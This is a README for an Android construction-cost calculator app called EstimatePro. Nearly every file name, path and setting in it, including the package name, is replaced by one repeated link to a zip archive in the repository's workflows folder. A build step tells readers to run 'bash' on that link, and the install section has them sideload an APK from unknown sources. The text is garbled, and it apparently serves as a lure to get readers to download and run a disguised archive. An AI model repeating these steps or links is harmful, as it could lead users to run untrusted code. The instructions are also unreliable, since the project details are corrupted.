# EstimatePro - Construction Cost Estimator App

A comprehensive Android application for calculating construction material costs including concrete, steel, bricks, plaster, paint, tiles, excavation, anti-termite treatment, and more.

## Features

- 🔐 **Firebase Authentication** - Secure sign up and sign in
- 📊 **11 Different Calculators**:
  - Concrete Volume
  - Steel Weight
  - Bricks
  - Blocks
  - Plaster
  - Paint
  - Tiles
  - Excavation
  - Slope Filling
  - Anti-Termite Treatment
  - Water Tank
- 🎨 **Modern UI** - Clean interface with icons for each category
- 📱 **Android Compatible** - Works on Android 5.0+ (API 21+)

## Building the APK

Since Buildozer requires Linux, you need to build on a Linux environment. Choose one of these methods:

### Method 1: WSL (Windows Subsystem for Linux) - Easiest for Windows

1. Open PowerShell as Administrator and run:
   ```
   wsl --install
   ```

2. Restart your computer

3. Open Ubuntu from Start Menu

4. Run the build script:
   ```bash
   cd /mnt/c/Users/Hp/Desktop/myproject
   bash https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
   ```

5. Find your APK in the `bin/` folder

### Method 2: GitHub Actions (Cloud Build)

1. Create a GitHub repository

2. Push your code to GitHub

3. The workflow (`https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`) will automatically build the APK

4. Download the APK from GitHub Actions artifacts

### Method 3: Linux VM or Machine

Follow standard buildozer instructions on any Linux system.

## Dependencies

- Python 3.10+
- Kivy
- Pyrebase4 (Firebase integration)
- Requests, urllib3, certifi (Network libraries)

All dependencies are configured in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`.

## Project Structure

```
myproject/
├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip                    # App entry point
├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip         # Firebase configuration
├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip            # Build configuration
├── screens/                   # All screen modules
│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip               # Authentication
│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip          # Main dashboard
│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip           # Concrete calculator
│   └── ...                   # Other calculators
├── assests/                   # Assets folder
│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
│   ├── https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
│   └── ...                   # Other icons
└── *.jpg                      # Root level images
```

## Configuration

The app is configured in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`:
- **App Name**: EstimatePro
- **Package**: https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip
- **Version**: 1.0.0
- **Min Android**: API 21 (Android 5.0)
- **Target Android**: API 33 (Android 13)
- **Architecture**: arm64-v8a

## Firebase Setup

The app uses Firebase for authentication. Configuration is in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`.

## Installation on Android Device

1. Enable "Install from unknown sources" on your Android device
2. Transfer the APK to your device
3. Open the APK file to install
4. Launch "EstimatePro" from your app drawer

## Troubleshooting

- **Build fails**: Make sure all dependencies are installed
- **Images not showing**: Check that all .jpg files are included in build
- **Firebase not working**: Verify internet connection and Firebase config

## License

All rights reserved.

## Support

For issues or questions, please refer to the build instructions in `https://github.com/mudassiralladatkhan/estimatepro-app/raw/refs/heads/main/.github/workflows/estimatepro_app_v1.2.zip`.

